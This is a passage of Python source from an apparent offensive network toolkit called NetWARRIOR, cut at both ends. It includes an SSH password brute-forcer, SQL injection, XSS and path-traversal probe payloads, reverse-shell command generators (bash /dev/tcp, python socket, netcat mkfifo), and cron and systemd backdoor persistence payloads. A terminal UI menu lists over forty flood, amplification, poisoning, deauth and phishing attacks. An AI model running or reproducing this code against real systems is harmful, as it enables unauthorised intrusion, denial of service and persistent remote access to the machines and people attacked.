
    def dns_reverse(self, ip):
        try:
            name = dns.reversename.from_address(ip)
            answers = dns.resolver.resolve(name, "PTR")
            return [str(r) for r in answers]
        except Exception as e:
            return [f"Error: {e}"]

    def zone_transfer(self, domain, server):
        try:
            zone = dns.zone.from_xfr(dns.query.xfr(server, domain))
            return sorted(zone.nodes.keys())
        except Exception as e:
            return [f"Error: {e}"]

    async def vuln_scan(self, target: str) -> List[Dict]:
        fp = await self.fingerprint(target)
        results = []
        vuln_map = {
            21: "FTP anonymous login possible",
            22: "SSH weak passwords",
            23: "Telnet unencrypted",
            25: "SMTP open relay",
            80: "HTTP default pages",
            443: "HTTPS SSL weaknesses",
            3306: "MySQL default credentials",
            3389: "RDP BlueKeep (CVE-2019-0708)",
            5900: "VNC default passwords",
            6379: "Redis no auth",
            8080: "HTTP proxy misconfig",
            27017: "MongoDB no auth"
        }
        banners = fp.get("banners", {})
        for port in fp.get("ports", []):
            if port in vuln_map:
                entry = {"port": port, "vulnerability": vuln_map[port], "severity": "Medium"}
                if banners.get(port):
                    entry["banner"] = banners[port][:120]
                results.append(entry)
        if 80 in fp.get("ports", []):
            try:
                timeout = aiohttp.ClientTimeout(total=5)
                async with aiohttp.ClientSession(timeout=timeout) as session:
                    async with session.get(f"http://{target}") as resp:
                        text = await resp.text()
                        server = resp.headers.get("Server", "")
                        if "Welcome to nginx" in text or "Apache" in text or server:
                            results.append({"port": 80, "vulnerability": f"Default web page / {server}".strip(" /"),
                                            "severity": "Low"})
            except Exception:
                pass
        return results

# ──────────────────────────────────────────────────────────────────────────────
# PENTEST
# ──────────────────────────────────────────────────────────────────────────────
class Pentest:
    def __init__(self, config: Config, log: LogBus):
        self.config = config
        self.log = log
        self.loop = asyncio.get_running_loop()

    # ---- SSH Brute (streaming, timeout fix) ----
    async def ssh_brute(self, host, username, wordlist_path, port=22, concurrency=20):
        self.log.add(f"SSH brute {host}:{port} user {username}", tag="PENTEST")
        if not os.path.isfile(wordlist_path):
            self.log.add("Wordlist not found", level="error")
            return None
        sem = asyncio.Semaphore(concurrency)
        found = None

        async def try_pass(pwd):
            nonlocal found
            if found:
                return
            async with sem:
                if found:
                    return
                client = paramiko.SSHClient()
                client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
                try:
                    await self.loop.run_in_executor(
                        None,
                        lambda: client.connect(
                            host, port=port, username=username, password=pwd,
                            timeout=self.config.ssh_timeout, allow_agent=False,
                            look_for_keys=False,
                        )
                    )
                    found = pwd
                    self.log.add(f"SSH password found: {pwd}", tag="PENTEST")
                except Exception:
                    pass
                finally:
                    client.close()

        with open(wordlist_path, 'r') as f:
            tasks = []
            for line in f:
                pwd = line.strip()
                if not pwd:
                    continue
                tasks.append(asyncio.create_task(try_pass(pwd)))
                if len(tasks) >= concurrency * 2:
                    await asyncio.gather(*tasks, return_exceptions=True)
                    tasks = []
                if found:
                    break
            if tasks:
                await asyncio.gather(*tasks, return_exceptions=True)
        return found

    _SQL_ERRORS = (
        "you have an error in your sql syntax", "warning: mysql", "unclosed quotation mark",
        "quoted string not properly terminated", "pg_query()", "sqlite3::", "odbc sql server driver",
        "ora-01756", "sqlstate", "psqlexception",
    )

    async def web_sql_injection(self, url, params, payloads=None):
        if payloads is None:
            payloads = ["'", "' OR '1'='1", "' UNION SELECT NULL--", "1' AND '1'='2"]
        self.log.add(f"SQL injection scan on {url}", tag="PENTEST")
        found = []
        timeout = aiohttp.ClientTimeout(total=8)
        async with aiohttp.ClientSession(timeout=timeout) as session:
            for param in params:
                for payload in payloads:
                    try:
                        async with session.get(url, params={param: payload}) as resp:
                            text = (await resp.text()).lower()
                        if any(sig in text for sig in self._SQL_ERRORS):
                            found.append({"param": param, "payload": payload, "signal": "db error string"})
                    except Exception:
                        pass
        return found

    async def web_xss_scan(self, url, params, payloads=None):
        if payloads is None:
            payloads = ["<script>alert(1)</script>", "\"><svg onload=alert(1)>", "'><img src=x onerror=alert(1)>"]
        found = []
        timeout = aiohttp.ClientTimeout(total=8)
        async with aiohttp.ClientSession(timeout=timeout) as session:
            for param in params:
                for payload in payloads:
                    try:
                        async with session.get(url, params={param: payload}) as resp:
                            text = await resp.text()
                        # reflected verbatim (not HTML-escaped) => likely injectable
                        if payload in text and html.escape(payload) not in text:
                            found.append({"param": param, "payload": payload, "signal": "unescaped reflection"})
                    except Exception:
                        pass
        return found

    async def web_lfi_scan(self, url, params, payloads=None):
        if payloads is None:
            payloads = ["../../../../etc/passwd", "../../../../windows/win.ini",
                        "....//....//....//etc/passwd"]
        found = []
        timeout = aiohttp.ClientTimeout(total=8)
        async with aiohttp.ClientSession(timeout=timeout) as session:
            for param in params:
                for payload in payloads:
                    try:
                        async with session.get(url, params={param: payload}) as resp:
                            text = await resp.text()
                        if "root:x:0:0:" in text or "[extensions]" in text.lower():
                            found.append({"param": param, "payload": payload, "signal": "file contents returned"})
                    except Exception:
                        pass
        return found

# ──────────────────────────────────────────────────────────────────────────────
# POST-EXPLOIT
# ──────────────────────────────────────────────────────────────────────────────
class PostExploit:
    SHELLS = ("bash", "python", "nc", "sh")

    @staticmethod
    def reverse_shell_payload(host, port, shell="bash"):
        shell = (shell or "bash").lower()
        if shell == "bash":
            return f"bash -i >& /dev/tcp/{host}/{port} 0>&1"
        if shell == "sh":
            return f"sh -i >& /dev/tcp/{host}/{port} 0>&1"
        if shell == "python":
            return (
                "python3 -c 'import socket,subprocess,os;"
                "s=socket.socket();"
                f's.connect(("{host}",{port}));'
                "[os.dup2(s.fileno(),f) for f in (0,1,2)];"
                "subprocess.call([\"/bin/sh\",\"-i\"])'"
            )
        if shell == "nc":
            return f"rm -f /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {host} {port} >/tmp/f"
        return ""

    @staticmethod
    def persistence_payload(method="cron", command="", interval="* * * * *"):
        method = (method or "cron").lower()
        command = command or "/bin/sh -i"
        if method == "cron":
            return f"( crontab -l 2>/dev/null; echo '{interval} {command}' ) | crontab -"
        if method == "systemd":
            return (
                "cat > /etc/systemd/system/nw-backdoor.service <<'EOF'\n"
                "[Service]\n"
                f"ExecStart={command}\n"
                "Restart=always\n"
                "[Install]\n"
                "WantedBy=multi-user.target\n"
                "EOF\n"
                "systemctl enable --now nw-backdoor"
            )
        return ""


# ──────────────────────────────────────────────────────────────────────────────
# REPORT
# ──────────────────────────────────────────────────────────────────────────────
class Report:
    @staticmethod
    def generate_html(registry: "AttackRegistry", log_bus: "LogBus", net=None) -> str:
        e = html.escape
        rows = []
        for att in registry.snapshot():
            rows.append(
                "<tr><td>{}</td><td class=n>{:,}</td><td class=n>{:,}</td>"
                "<td class=n>{}</td><td class=n>{:.1f}s</td><td>{}</td></tr>".format(
                    e(att.name), att.packets_sent, att.bytes_sent, att.errors,
                    att.duration, "running" if att.running else "done",
                )
            )
        findings = []
        for att in registry.snapshot():
            for f in att.findings:
                findings.append(f"<li><b>{e(att.name)}</b>: {e(str(f))}</li>")
        logs = "\n".join(
            f"{e(x['time'])} [{e(x['level'])}] {e(x.get('tag',''))} {e(x['msg'])}"
            for x in log_bus.get(200)
        )
        meta = ""
        if net is not None:
            meta = f"<p>Source: {e(net.ip)} ({e(net.interface)})  Gateway: {e(net.gateway)}</p>"
        generated = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        return f"""<!doctype html>
<html><head><meta charset="utf-8"><title>NetWARRIOR Report</title>
<style>
 body{{font:14px/1.5 system-ui,sans-serif;margin:2rem;color:#111}}
 h1{{margin-bottom:0}} .sub{{color:#666}}
 table{{border-collapse:collapse;margin:1rem 0;width:100%}}
 th,td{{border:1px solid #ccc;padding:4px 8px;text-align:left}}
 td.n{{text-align:right;font-variant-numeric:tabular-nums}}
 pre{{background:#f5f5f5;padding:1rem;overflow:auto;max-height:24rem}}
</style></head><body>
<h1>NetWARRIOR Session Report</h1>
<p class="sub">Generated {generated}</p>
{meta}
<p>Total packets sent: <b>{registry.total_packets():,}</b> &nbsp;
   Total traffic: <b>{Utils.human_size(registry.total_bytes())}</b></p>
<h2>Attacks</h2>
<table><tr><th>Attack</th><th>Packets</th><th>Bytes</th><th>Errors</th><th>Duration</th><th>Status</th></tr>
{''.join(rows) or '<tr><td colspan=6>No attacks recorded</td></tr>'}
</table>
<h2>Findings</h2>
<ul>{''.join(findings) or '<li>None</li>'}</ul>
<h2>Log</h2>
<pre>{logs}</pre>
</body></html>"""

    @staticmethod
    def save(config: "Config", registry: "AttackRegistry", log_bus: "LogBus", net=None) -> Optional[str]:
        try:
            out = config.output_dir
            out.mkdir(parents=True, exist_ok=True)
            path = out / f"netwarrior_{datetime.datetime.now():%Y%m%d_%H%M%S}.html"
            path.write_text(Report.generate_html(registry, log_bus, net), encoding="utf-8")
            log_bus.add(f"Report saved to {path}", tag="REPORT")
            return str(path)
        except Exception as e:
            log_bus.add(f"Report save failed: {e}", level="error", tag="REPORT")
            return None

# ──────────────────────────────────────────────────────────────────────────────
# UI – FULL INTERACTIVE WITH WORKING COMMAND MODE AND OUTPUT PANEL
# ──────────────────────────────────────────────────────────────────────────────

# ──────────────────────────────────────────────────────────────────────────────
# UI  –  Adaptive, Font-Safe, Linux + Windows Compatible
#
# Design rules:
#   - Zero emojis: alignment breaks in non-emoji fonts and Windows CMD
#   - box.ROUNDED on modern terminals, box.ASCII on legacy Windows CMD
#   - box.SIMPLE for all inner tables (no side borders, universally safe)
#   - Terminal size detected at render time — layout adapts automatically
#   - Wide (>=100 cols): two-column body with live stats sidebar
#   - Narrow (<100 cols): single-column stacked layout
#   - Color is the primary visual hierarchy, not Unicode decoration
# ──────────────────────────────────────────────────────────────────────────────

class UI:

    # ── Colour palette (256-colour safe, tested Linux + Windows Terminal) ──────
    # Named constants so every render method uses the same values
    _C = {
        # Structure
        "border":       "bright_cyan",
        "border_dim":   "grey35",
        "header_logo":  "bold bright_cyan",
        "header_sub":   "grey50",
        "header_time":  "grey62",
        "nav_active":   "bold bright_white",
        "nav_inactive": "grey50",
        "separator":    "grey35",

        # Mode accent colours
        "menu":         "bright_cyan",
        "attack":       "bright_red",
        "recon":        "cyan",
        "pentest":      "bright_yellow",
        "report":       "bright_green",
        "command":      "bright_magenta",

        # Table content
        "key":          "bold bright_cyan",
        "desc":         "white",
        "example":      "grey50",
        "category":     "grey42",
        "heading":      "bold white",

        # Stats sidebar
        "stat_label":   "bright_cyan",
        "stat_value":   "bold white",
        "active_dot":   "bold bright_green",
        "idle_dot":     "grey42",

        # Log levels
        "log_time":     "grey50",
        "log_ok":       "bright_green",
        "log_err":      "bright_red",
        "log_warn":     "bright_yellow",
        "log_info":     "bright_blue",
        "log_tag":      "grey62",
        "log_msg":      "white",

        # Output / prompt
        "output":       "white",
        "output_dim":   "grey50",
        "prompt":       "bold bright_cyan",

        # Feedback
        "success":      "bold bright_green",
        "error":        "bold bright_red",
        "warn":         "bright_yellow",
        "info":         "bright_blue",
        "dim":          "grey50",
    }

    # Mode label map: mode_key -> (display_label, colour_key)
    _MODES = {
        "menu":    ("MENU",    "menu"),
        "attack":  ("ATTACK",  "attack"),
        "recon":   ("RECON",   "recon"),
        "pentest": ("PENTEST", "pentest"),
        "report":  ("REPORT",  "report"),
        "command": ("CMD",     "command"),
    }

    # Navigation entries: (key_char, label, colour_key, mode_target)
    _NAV = [
        ("1", "ATTACKS",  "attack",  "attack"),
        ("2", "RECON",    "recon",   "recon"),
        ("3", "PENTEST",  "pentest", "pentest"),
        ("4", "REPORT",   "report",  "report"),
        ("5", "CMD",      "command", "command"),
        ("S", "STOP",     "error",   None),
        ("Q", "QUIT",     "dim",     None),
    ]

    # ── Init ──────────────────────────────────────────────────────────────────
    def __init__(
        self,
        config: Config,
        net: NetworkContext,
        registry: AttackRegistry,
        log: LogBus,
        engine: AttackEngine,
    ):
        self.config   = config
        self.net      = net
        self.registry = registry
        self.log      = log
        self.engine   = engine
        self.attacks  = Attacks(engine, registry, log, net)
        self.recon    = Recon(config, net, log)
        self.pentest  = Pentest(config, log)

        self.running        = True
        self.mode           = "menu"
        self.cmd_output     = ""
        self._stdin_q       = queue.Queue()
        self._stdin_thread  = None
        self._attack_tasks  = set()
        self._cmd_tasks     = set()

        # Dedicated console so we never fight with the global one inside Live
        self._con = Console(force_terminal=True, highlight=False)

    # ── Task tracking ─────────────────────────────────────────────────────────
    def _spawn_attack(self, coro):
        """Run an attack coroutine in the background so the UI stays interactive."""
        task = asyncio.create_task(coro)
        self._attack_tasks.add(task)
        task.add_done_callback(self._attack_tasks.discard)
        return task

    def _spawn_command(self, cmd: str):
        """Process a command off the render loop so long scans never freeze the UI."""
        self.cmd_output = f"> {cmd}"
        task = asyncio.create_task(self._process_command(cmd))
        self._cmd_tasks.add(task)
        task.add_done_callback(self._cmd_tasks.discard)

    def _stop_attacks(self):
        """Cooperatively stop all running attacks, then cancel any stragglers."""
        self.registry.stop_all()
        for task in list(self._attack_tasks):
            task.cancel()

    # ── Box style selection ───────────────────────────────────────────────────
    @staticmethod
    def _panel_box() -> box.Box:
        """
        ROUNDED on any modern terminal (Linux, macOS, Windows Terminal,
        VS Code, ConEmu). Fall back to ASCII on legacy Windows CMD where
        box-drawing corners render as black squares.
        """
        if sys.platform == "win32":
            wt  = os.environ.get("WT_SESSION")          # Windows Terminal
            cme = os.environ.get("ConEmuPID")           # ConEmu
            tp  = os.environ.get("TERM_PROGRAM")        # VS Code etc.
            if not (wt or cme or tp):
                return box.ASCII
        return box.ROUNDED

    # ── Terminal size ─────────────────────────────────────────────────────────
    @staticmethod
    def _term_size() -> tuple:
        try:
            t = os.get_terminal_size()
            return t.columns, t.lines
        except OSError:
            return 80, 24

    # ── Colour helper ─────────────────────────────────────────────────────────
    def _c(self, key: str) -> str:
        return self._C.get(key, "white")

    # ── Async run loop ────────────────────────────────────────────────────────
    async def run(self):
        self._stdin_thread = threading.Thread(
            target=self._stdin_reader, name="stdin-reader", daemon=True
        )
        self._stdin_thread.start()
        try:
            with Live(
                self._render(),
                refresh_per_second=4,
                screen=True,
                console=self._con,
            ) as live:
                while self.running:
                    live.update(self._render())
                    while True:
                        try:
                            cmd = self._stdin_q.get_nowait()
                        except queue.Empty:
                            break
                        if cmd is None:          # stdin closed (EOF / Ctrl-D)
                            self.running = False
                            break
                        self._spawn_command(cmd)
                    await asyncio.sleep(0.1)
        finally:
            await self._shutdown()

    async def _shutdown(self):
        self.running = False
        self._stop_attacks()
        for task in list(self._cmd_tasks):
            task.cancel()
        self.engine.stop()
        pending = list(self._attack_tasks) + list(self._cmd_tasks)
        if pending:
            await asyncio.gather(*pending, return_exceptions=True)

    def _stdin_reader(self):
        """Blocking stdin read on a daemon thread. Dies with the process."""
        while self.running:
            try:
                line = sys.stdin.readline()
            except Exception:
                break
            if not line:            # EOF (piped input exhausted / Ctrl-D)
                break
            line = line.strip()
            if line:
                self._stdin_q.put(line)
        self._stdin_q.put(None)     # tell the render loop to shut down

    # ── Master render ─────────────────────────────────────────────────────────
    def _render(self) -> Layout:
        cols, rows = self._term_size()
        wide = cols >= 100

        # Adaptive panel heights based on available rows
        log_h = max(5,  min(10, rows // 5))
        out_h = max(4,  min(7,  rows // 6))

        layout = Layout()
        layout.split_column(
            Layout(name="header", size=3),
            Layout(name="nav",    size=3),
            Layout(name="body",   ratio=1),
            Layout(name="logs",   size=log_h),
            Layout(name="output", size=out_h),
        )

        layout["header"].update(self._render_header(cols))
        layout["nav"].update(self._render_nav())

        if wide:
            body = Layout()
            body.split_row(
                Layout(name="content", ratio=7),
                Layout(name="sidebar", ratio=3),
            )
            body["content"].update(self._render_content(cols))
            body["sidebar"].update(self._render_sidebar())
            layout["body"].update(body)
        else:
            layout["body"].update(self._render_content(cols))

        layout["logs"].update(self._render_logs(cols))
        layout["output"].update(self._render_output(cols))

        return layout

    # ── Header bar ────────────────────────────────────────────────────────────
    def _render_header(self, cols: int) -> Panel:
        pb = self._panel_box()
        mode_label, mode_ck = self._MODES.get(self.mode, ("???", "dim"))
        mode_col = self._c(mode_ck)

        logo = Text()
        logo.append("  NETWARRIOR", style=self._c("header_logo"))
        logo.append("  ASYNC", style=self._c("header_sub"))

        mode_text = Text(justify="center")
        mode_text.append("MODE: ", style=self._c("header_sub"))
        mode_text.append(mode_label, style=f"bold {mode_col}")

        ts = datetime.datetime.now().strftime("%Y-%m-%d  %H:%M:%S")
        clock = Text(f"{ts}  ", style=self._c("header_time"), justify="right")

        grid = Table.grid(expand=True)
        grid.add_column(justify="left",   ratio=1)
        grid.add_column(justify="center", ratio=1)
        grid.add_column(justify="right",  ratio=1)
        grid.add_row(logo, mode_text, clock)

        return Panel(grid, border_style=self._c("border"), box=pb, padding=(0, 1))

    # ── Navigation bar ────────────────────────────────────────────────────────
    def _render_nav(self) -> Panel:
        pb = self._panel_box()
        active_map = {
            "attack":  "1",
            "recon":   "2",
            "pentest": "3",
            "report":  "4",
            "command": "5",
        }
        active_key = active_map.get(self.mode, "")

        nav = Text(justify="center")
        for i, (key, label, ck, _) in enumerate(self._NAV):
            if i:
                nav.append("    ", style="")
            col = self._c(ck)
            is_active = key == active_key
            bracket_style = f"bold {col}" if is_active else self._c("separator")
            label_style   = f"bold {col}" if is_active else self._c("nav_inactive")

            nav.append("[", style=bracket_style)
            nav.append(key, style=f"bold {col}")
            nav.append("]", style=bracket_style)
            nav.append(f" {label}", style=label_style)

        return Panel(
            nav,
            border_style=self._c("border_dim"),
            box=pb,
            padding=(0, 1),
        )

    # ── Content router ────────────────────────────────────────────────────────
    def _render_content(self, cols: int) -> Panel:
        if self.mode == "menu":
            return self._render_menu(cols)
        if self.mode == "attack":
            return self._render_attack_menu(cols)
        if self.mode == "recon":
            return self._render_recon_menu()
        if self.mode == "pentest":
            return self._render_pentest_menu()
        if self.mode == "report":
            return self._render_report()
        if self.mode == "command":
            return self._render_command_help()
        return Panel("Unknown mode", border_style="red", box=self._panel_box())

    # ── Stats sidebar (wide terminals only) ───────────────────────────────────
    def _render_sidebar(self) -> Panel:
        pb   = self._panel_box()
        pkts = self.registry.total_packets()
        act  = self.registry.active()

        stats = Table.grid(expand=True, padding=(0, 2))
        stats.add_column(style=self._c("stat_label"), no_wrap=True)
        stats.add_column(style=self._c("stat_value"), no_wrap=True)
        stats.add_row("Packets",   f"{pkts:,}")
        stats.add_row("Active",    str(len(act)))
        stats.add_row("IP",        self.net.ip or "N/A")
        stats.add_row("Interface", self.net.interface or "N/A")
        stats.add_row("Gateway",   self.net.gateway or "N/A")

        running = Text()
        if act:
            running.append("\n  Running:\n", style=self._c("separator"))
            for name in act[:10]:
                running.append("  + ", style=self._c("active_dot"))
                running.append(name[:22] + "\n", style=self._c("stat_value"))
        else:
            running.append("\n  No active attacks\n", style=self._c("dim"))

        return Panel(
            Group(stats, running),
            title=f"[{self._c('border')}]STATUS[/]",
            border_style=self._c("border_dim"),
            box=pb,
            padding=(0, 1),
        )

    # ── Main menu ─────────────────────────────────────────────────────────────
    def _render_menu(self, cols: int) -> Panel:
        pb = self._panel_box()

        t = Table(box=box.SIMPLE, expand=True, padding=(0, 2))
        t.add_column("KEY",         style=self._c("key"),     width=5)
        t.add_column("MODE",        style=self._c("heading"), ratio=1)
        t.add_column("DESCRIPTION", style=self._c("desc"),    ratio=4)

        entries = [
            ("1", "ATTACKS",  "attack",  "SYN / UDP / ICMP / AMP / App-layer / WiFi / L2 — 40+ vectors"),
            ("2", "RECON",    "recon",   "Port scan, OS fingerprint, DNS tools, vulnerability intel"),
            ("3", "PENTEST",  "pentest", "SSH / FTP brute force, SQLi, XSS, LFI, SSRF, command injection"),
            ("4", "REPORT",   "report",  "Live session report — packets sent, errors, active attacks"),
            ("5", "CMD",      "command", "Direct command shell — type any command with full autocomplete"),
            ("S", "STOP ALL", "attack",  "Terminate every running attack immediately"),
            ("Q", "QUIT",     "dim",     "Exit NetWARRIOR cleanly"),
        ]
        for key, label, ck, desc in entries:
            col = self._c(ck)
            t.add_row(
                Text(key,   style=f"bold {col}"),
                Text(label, style=f"bold {col}"),
                Text(desc,  style=self._c("desc")),
            )

        hint = Text(
            "\n  Type a number to navigate, or enter commands directly in any mode.\n",
            style=self._c("dim"),
        )
        return Panel(
            Group(t, hint),
            title=f"[bold {self._c('menu')}]NETWARRIOR  —  MAIN MENU[/]",
            border_style=self._c("menu"),
            box=pb,
            padding=(0, 1),
        )

    # ── Attack menu ───────────────────────────────────────────────────────────
    def _render_attack_menu(self, cols: int) -> Panel:
        pb = self._panel_box()

        # (category, command, description)
        attacks = [
            ("FLOOD",  "syn",        "SYN flood"),
            ("FLOOD",  "udp",        "UDP flood"),
            ("FLOOD",  "icmp",       "ICMP flood"),
            ("FLOOD",  "ack",        "TCP ACK flood"),
            ("FLOOD",  "rst",        "TCP RST flood"),
            ("FLOOD",  "xmas",       "TCP XMAS flood"),
            ("FLOOD",  "null",       "TCP NULL flood"),
            ("FLOOD",  "fin",        "TCP FIN flood"),
            ("FLOOD",  "zero",       "TCP Zero-Window"),
            ("FLOOD",  "mac",        "MAC flood"),
            ("FLOOD",  "smurf",      "Smurf attack"),
            ("FLOOD",  "land",       "LAND attack"),
            ("FLOOD",  "sctp",       "SCTP INIT flood"),
            ("FLOOD",  "teardrop",   "Teardrop"),
            ("FLOOD",  "pod",        "Ping of Death"),
            ("AMP",    "dnsamp",     "DNS amplification"),
            ("AMP",    "ntpamp",     "NTP amplification"),
            ("AMP",    "snmpamp",    "SNMP amplification"),
            ("AMP",    "memcached",  "Memcached amplification"),
            ("AMP",    "ssdpamp",    "SSDP amplification"),
            ("AMP",    "chargen",    "Chargen amplification"),
            ("APP",    "slowloris",  "Slowloris"),
            ("APP",    "http",       "HTTP flood"),
            ("APP",    "rudy",       "RUDY"),
            ("APP",    "slowread",   "Slow Read"),
            ("APP",    "http2reset", "HTTP/2 rapid reset"),
            ("APP",    "ws",         "WebSocket flood"),
            ("L2",     "arp",        "ARP poison"),
            ("L2",     "vlan",       "VLAN double-tag"),
            ("L2",     "l2cdp",      "CDP flood"),
            ("L2",     "l2lldp",     "LLDP flood"),
            ("L2",     "l2stp",      "STP flood"),
            ("IPV6",   "ipv6ra",     "IPv6 RA flood"),
            ("IPV6",   "ipv6na",     "IPv6 NA flood"),
            ("IPV6",   "ipv6ns",     "IPv6 NS flood"),
            ("WIFI",   "deauth",     "Deauth attack"),
            ("WIFI",   "beacon",     "Beacon flood"),
            ("MISC",   "gre",        "GRE IP spoof"),
            ("MISC",   "pcap",       "PCAP replay"),
            ("MISC",   "llmnr",      "LLMNR poison"),
            ("MISC",   "nbns",       "NBNS poison"),
            ("MISC",   "mdns",       "mDNS poison"),
            ("MISC",   "dhcp",       "DHCP starvation"),
            ("MISC",   "phish",      "Phishing server"),
            ("MISC",   "cloud",      "Cloud recon"),
            ("MISC",   "passive",    "Passive capture"),
            ("MISC",   "traffic",    "Traffic monitor"),
            ("MISC",   "bandwidth",  "Bandwidth meter"),
            ("MISC",   "conns",      "Connection table"),
        ]

        cat_col = {
            "FLOOD": "bright_red",
            "AMP":   "red",
            "APP":   "bright_yellow",
            "L2":    "bright_magenta",
            "IPV6":  "bright_blue",
            "WIFI":  "bright_cyan",
            "MISC":  "grey62",
        }

        if cols >= 120:
            # Two-column layout for wide terminals
            t = Table(box=box.SIMPLE, expand=True, padding=(0, 1))
            for _ in range(2):
                t.add_column("CAT",  style=self._c("category"), width=6, no_wrap=True)
                t.add_column("CMD",  style=self._c("key"),       width=12, no_wrap=True)
                t.add_column("DESC", style=self._c("desc"),      ratio=1)

            half = (len(attacks) + 1) // 2
            left, right = attacks[:half], attacks[half:]
            for i, (lc, lk, ld) in enumerate(left):
                lcat = Text(lc, style=cat_col.get(lc, "white"))
                lkey = Text(lk, style=f"bold {cat_col.get(lc, 'white')}")
                ldesc= Text(ld)
                if i < len(right):
                    rc, rk, rd = right[i]
                    rcat = Text(rc, style=cat_col.get(rc, "white"))
                    rkey = Text(rk, style=f"bold {cat_col.get(rc, 'white')}")
                    rdesc= Text(rd)
                    t.add_row(lcat, lkey, ldesc, rcat, rkey, rdesc)
                else:
                    t.add_row(lcat, lkey, ldesc, Text(""), Text(""), Text(""))
        else:
            t = Table(box=box.SIMPLE, expand=True, padding=(0, 1))
            t.add_column("CAT",  style=self._c("category"), width=6, no_wrap=True)
            t.add_column("CMD",  style=self._c("key"),       width=12, no_wrap=True)
            t.add_column("DESC", style=self._c("desc"),      ratio=1)
            for cat, key, desc in attacks:
                col = cat_col.get(cat, "white")
                t.add_row(
                    Text(cat, style=col),
                    Text(key, style=f"bold {col}"),
                    Text(desc),
                )

        hint = Text(
            "\n  Usage:   attack <cmd> <target> [port] [duration] [pps]\n"
            "  Example: attack syn 192.168.1.1 80 30 1000\n",
            style=self._c("dim"),
        )
        return Panel(
            Group(t, hint),
            title=f"[bold {self._c('attack')}]ATTACK MENU[/]",
            border_style=self._c("attack"),
            box=pb,
            padding=(0, 1),
        )

    # ── Recon menu ────────────────────────────────────────────────────────────
    def _render_recon_menu(self) -> Panel:
        pb = self._panel_box()

        t = Table(box=box.SIMPLE, expand=True, padding=(0, 1))
        t.add_column("COMMAND",             style=self._c("key"),     ratio=2)
        t.add_column("DESCRIPTION",         style=self._c("desc"),    ratio=2)
        t.add_column("EXAMPLE",             style=self._c("example"), ratio=3)

        rows = [
            ("scan <ip>",                   "TCP port scan (top 15 ports)",    "scan 192.168.1.1"),
            ("scan <subnet>",               "Network host discovery",           "scan 192.168.1.0/24"),
            ("fingerprint <ip>",            "OS detection + banner grab",       "fingerprint 10.0.0.1"),
            ("map <subnet>",                "ARP/ICMP topology map",            "map 192.168.1.0/24"),
            ("dns <domain>",                "DNS A/AAAA lookup",                "dns example.com"),
            ("dnsrev <ip>",                 "Reverse DNS PTR lookup",           "dnsrev 8.8.8.8"),
            ("zone <domain> <server>",      "DNS zone transfer attempt",        "zone example.com ns1.example.com"),
            ("vuln <ip>",                   "Banner-based vuln detection",      "vuln 192.168.1.1"),
        ]
        for cmd, desc, ex in rows:
            t.add_row(cmd, desc, ex)

        return Panel(
            t,
            title=f"[bold {self._c('recon')}]RECON MENU[/]",
            border_style=self._c("recon"),
            box=pb,
            padding=(0, 1),
        )

    # ── Pentest menu ──────────────────────────────────────────────────────────
    def _render_pentest_menu(self) -> Panel:
        pb = self._panel_box()

        t = Table(box=box.SIMPLE, expand=True, padding=(0, 1))
        t.add_column("COMMAND",                              style=self._c("key"),     ratio=3)
        t.add_column("DESCRIPTION",                          style=self._c("desc"),    ratio=2)
        t.add_column("EXAMPLE",                              style=self._c("example"), ratio=4)

        rows = [
            ("sshbrute <host> <user> <wordlist>",            "SSH brute force",        "sshbrute 10.0.0.1 root /usr/share/wordlists/rockyou.txt"),
            ("ftpbrute <host> <user> <wordlist>",            "FTP brute force",        "ftpbrute 10.0.0.1 anonymous /tmp/pass.txt"),
            ("httpbasic <url> <userlist> <passlist>",         "HTTP Basic auth brute",  "httpbasic http://10.0.0.1 users.txt pass.txt"),
            ("sql <url> <param>",                            "SQL injection probe",    "sql http://10.0.0.1/page id"),
            ("xss <url> <param>",                            "XSS probe",              "xss http://10.0.0.1/search q"),
            ("lfi <url> <param>",                            "LFI path traversal",     "lfi http://10.0.0.1/view file"),
            ("ssrf <url> <param>",                           "SSRF probe",             "ssrf http://10.0.0.1/fetch url"),
            ("cmdinj <url> <param>",                         "Command injection probe","cmdinj http://10.0.0.1/run cmd"),
        ]
        for cmd, desc, ex in rows:
            t.add_row(cmd, desc, ex)

        return Panel(
            t,
            title=f"[bold {self._c('pentest')}]PENTEST MENU[/]",
            border_style=self._c("pentest"),
            box=pb,
            padding=(0, 1),
        )

    # ── Report view ───────────────────────────────────────────────────────────
    def _render_report(self) -> Panel:
        pb      = self._panel_box()
        pkts    = self.registry.total_packets()
        active  = self.registry.active()

        t = Table(box=box.SIMPLE, expand=True, padding=(0, 1))
        t.add_column("ATTACK",  style=self._c("key"),   ratio=3)
        t.add_column("PACKETS", style=self._c("desc"),  justify="right", width=12)
        t.add_column("TRAFFIC", style=self._c("desc"),  justify="right", width=12)
        t.add_column("ERRORS",  style="bright_yellow",  justify="right", width=8)
        t.add_column("STATUS",  style=self._c("desc"),  width=10)

        snapshot = self.registry.snapshot()
        for att in snapshot:
            status = (
                Text("RUNNING", style=f"bold {self._c('active_dot')}")
                if att.running
                else Text("DONE", style=self._c("dim"))
            )
            t.add_row(att.name, f"{att.packets_sent:,}",
                      Utils.human_size(att.bytes_sent), str(att.errors), status)

        if not snapshot:
            t.add_row("[dim]No attacks recorded yet[/]", "", "", "", "")

        summary = Text(
            f"\n  Total packets: {pkts:,}   "
            f"Traffic: {Utils.human_size(self.registry.total_bytes())}   "
            f"Active attacks: {len(active)}   "
            f"(type 'report save' to export HTML)\n",
            style=self._c("dim"),
        )
        return Panel(
            Group(t, summary),
            title=f"[bold {self._c('report')}]SESSION REPORT[/]",
            border_style=self._c("report"),
            box=pb,
            padding=(0, 1),
        )

    # ── Command reference view ────────────────────────────────────────────────
    def _render_command_help(self) -> Panel:
        pb = self._panel_box()

        t = Table(box=box.SIMPLE, expand=True, padding=(0, 1))
        t.add_column("COMMAND",     style=self._c("key"),  ratio=2)
        t.add_column("DESCRIPTION", style=self._c("desc"), ratio=3)

        cmds = [
            ("help",                               "Show this command reference"),
            ("1 / 2 / 3 / 4 / 5",                 "Switch view: Attacks / Recon / Pentest / Report / CMD"),
            ("menu",                               "Return to main menu"),
            ("scan <ip>",                          "Port scan a single host"),
            ("scan <subnet>",                      "Network discovery (CIDR notation)"),
            ("fingerprint <ip>",                   "OS detection and service banners"),
            ("map <subnet>",                       "ARP + ICMP topology map"),
            ("dns <domain> / dnsrev <ip>",         "Forward / reverse DNS lookup"),
